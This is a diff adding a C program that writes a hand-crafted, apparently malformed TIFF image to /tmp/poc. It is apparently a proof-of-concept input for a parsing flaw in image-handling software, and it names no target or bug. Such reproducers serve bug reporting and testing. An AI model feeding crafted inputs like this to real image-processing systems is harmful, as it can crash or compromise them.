@@ -1,0 +1,83 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void) {
+    FILE *f = fopen("/tmp/poc", "wb");
+    if (!f) { perror("fopen"); return 1; }
+    
+    fputc(0x49, f); fputc(0x49, f);
+    fputc(0x2a, f); fputc(0x00, f);
+    fputc(0x08, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x0a, f); fputc(0x00, f);
+    
+    fputc(0x00, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x01, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x02, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0xba, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x03, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x06, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x11, f); fputc(0x01, f);
+    fputc(0x04, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0xba, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x16, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x17, f); fputc(0x01, f);
+    fputc(0x04, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x15, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x52, f); fputc(0x01, f);
+    fputc(0x03, f); fputc(0x00, f);
+    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
+    
+    for (int i = 0; i < 78; i++) {
+        fputc(0x00, f);
+    }
+    
+    fputc(0x08, f); fputc(0x00, f);
+    fputc(0x08, f); fputc(0x00, f);
+    fputc(0x08, f); fputc(0x00, f);
+    fputc(0x08, f); fputc(0x00, f);
+    
+    for (int i = 0; i < 96; i++) {
+        fputc(0x00, f);
+    }
+    
+    fputc(0xff, f); fputc(0xff, f); fputc(0xff, f); fputc(0xfe, f);
+    
+    fclose(f);
+    return 0;
+}
